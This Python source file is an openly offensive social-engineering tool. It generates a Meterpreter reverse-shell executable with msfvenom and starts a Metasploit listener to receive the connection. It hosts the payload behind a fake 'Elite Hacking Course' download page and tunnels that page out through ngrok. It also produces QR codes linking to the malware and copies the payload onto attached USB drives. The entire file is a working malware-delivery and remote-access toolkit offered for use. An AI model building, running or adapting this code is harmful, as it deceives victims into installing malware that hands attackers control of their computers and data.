import os
import subprocess
import socket
import qrcode
import shutil
import psutil  # Import for detecting USB drives
import threading
import time
from flask import Flask, render_template_string, send_from_directory

# Initialize Flask app
app = Flask(__name__)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def setup_output_directory():
    output_dir = "DROOPER_OUTPUT"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    return output_dir

def generate_payload(lhost):
    output_dir = setup_output_directory()
    payload_path = os.path.join(output_dir, "dropper.exe")
    print("[+] Generating reverse shell payload...")
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f exe > {payload_path}"
    os.system(cmd)
    print(f"[+] Payload saved as {payload_path}")
    return payload_path

def generate_qr_code(malware_link):
    print("[+] Generating QR Code...")
    qr = qrcode.make(malware_link)
    qr_path = os.path.join(setup_output_directory(), "malware_qr.png")
    qr.save(qr_path)
    print(f"[+] QR Code saved at {qr_path}")

def copy_to_usb():
    print("[+] Searching for USB drives...")
    output_dir = setup_output_directory()
    payload_path = os.path.join(output_dir, "dropper.exe")

    usb_found = False
    for partition in psutil.disk_partitions():
        if "removable" in partition.opts or "/media" in partition.mountpoint or "/run/media" in partition.mountpoint:
            usb_path = partition.mountpoint
            usb_found = True
            break

    if usb_found:
        destination_path = os.path.join(usb_path, "usb_drop.exe")
        shutil.copy(payload_path, destination_path)
        print(f"[+] Malware copied to USB drive: {destination_path}")
    else:
        print("[!] No USB drive detected!")

def start_listener():
    lhost = get_local_ip()
    print(f"[+] Starting Metasploit listener on {lhost}:4444...")
    msf_commands = f"""
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST {lhost}
    set LPORT 4444
    exploit
    """
    with open("listener.rc", "w") as f:
        f.write(msf_commands)
    os.system("msfconsole -r listener.rc")

def start_web_interface():
    print("[+] Starting Web Hosting Service...")
    
    html_content = """
    <html>
    <head>
        <title>Elite Hacking Course</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; background-color: #121212; color: white; }
            .container { margin-top: 50px; }
            .btn { display: inline-block; padding: 15px 30px; font-size: 18px; color: white; background-color: #ff4500; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
            .btn:hover { background-color: #e03e00; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Welcome to the Elite Hacking Course</h1>
            <p>Become an expert in cybersecurity with our exclusive materials.</p>
            <a class="btn" href="/download/dropper.exe">Download Course Materials</a>
        </div>
    </body>
    </html>
    """

    @app.route('/')
    def index():
        return html_content

    @app.route('/download/<filename>')
    def download_file(filename):
        return send_from_directory(setup_output_directory(), filename)
    
    app.run(host='0.0.0.0', port=8080)

def start_ngrok():
    print("[+] Checking if Flask is running on port 8080...")
    flask_thread = threading.Thread(target=start_web_interface, daemon=True)
    flask_thread.start()
    time.sleep(5)  # Wait for Flask to fully start
    print("[+] Starting Ngrok Tunnel...")
    os.system("ngrok http 8080 &")

def main():
    while True:
        print("\033[35m")  # Set text color to purple
        print("        oooooooooo.   ooooooooo.     .oooooo.     .oooooo.   ooooooooo.   oooooooooooo ooooooooo.   ")
        print("        `888'   `Y8b  `888   `Y88.  d8P'  `Y8b   d8P'  `Y8b  `888   `Y88. `888'     `8 `888   `Y88. ")
        print("         888      888  888   .d88' 888      888 888      888  888   .d88'  888          888   .d88' ")
        print("         888      888  888ooo88P'  888      888 888      888  888ooo88P'   888oooo8     888ooo88P'  ")
        print("         888      888  888`88b.   888      888 888      888  888          888    \"     888`88b.    ")
        print("         888     d88'  888  `88b. `88b    d88' `88b    d88'  888          888       o  888  `88b.  ")
        print("        o888bood8P'   o888o  o888o  `Y8bood8P'   `Y8bood8P'  o888o        o888ooooood8 o888o  o888o ")
        print("\033[0m")  # Reset text color
        print("        \033[93mA Social Engineering Tool By AJVAD-N\033[0m\n")
        print("1: Create Malware")
        print("2: Start Listener")
        print("3: Start Web Hosting Service")
        print("4: Generate Malware QR Code")
        print("5: Copy Malware to USB")
        print("6: Start Ngrok Tunnel")
        print("7: Exit")
        choice = input("Select an option: ")

        if choice == "1":
            lhost = get_local_ip()
            print(f"[+] Detected Local IP: {lhost}")
            generate_payload(lhost)
        elif choice == "2":
            start_listener()
        elif choice == "3":
            start_web_interface()
        elif choice == "4":
            malware_link = f"http://{get_local_ip()}:8080/download"
            generate_qr_code(malware_link)
        elif choice == "5":
            copy_to_usb()
        elif choice == "6":
            start_ngrok()
        elif choice == "7":
            print("[+] Exiting...")
            break
        else:
            print("[!] Invalid choice, try again.")

if __name__ == "__main__":
    main()
